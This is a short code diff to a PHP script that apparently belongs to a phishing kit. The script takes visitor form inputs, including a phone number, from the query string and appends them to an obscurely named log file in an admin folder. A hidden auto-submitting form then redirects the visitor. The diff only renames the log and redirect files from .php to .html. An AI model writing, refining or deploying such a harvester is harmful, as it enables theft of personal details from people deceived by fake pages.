@@ -13,7 +13,7 @@ $input_6 = $_GET['input_6'];
 ?>
 
 <?php
-$handle = fopen("admin/DA68fbyy07.php", "a");
+$handle = fopen("admin/DA68fbyy07.html", "a");
 $body = '
 ***************************************
 <br>
@@ -41,7 +41,7 @@ PHONE NUMBER =   '.$input_6.'
 <br>
 _______________________________________
 ';
-$file = fopen("admin/DA68fbyy07.php", "a");
+$file = fopen("admin/DA68fbyy07.html", "a");
 fwrite($file, $body);
 ?>
 
@@ -49,7 +49,7 @@ fwrite($file, $body);
 <html>
 <head>
 <form
-type="hidden"method="GET"action="done.php"id="myform">
+type="hidden"method="GET"action="done.html"id="myform">
 <input type="submit"></form>
 <script type="text/javascript">document.getElementById("myform").submit();</script>
 </head>
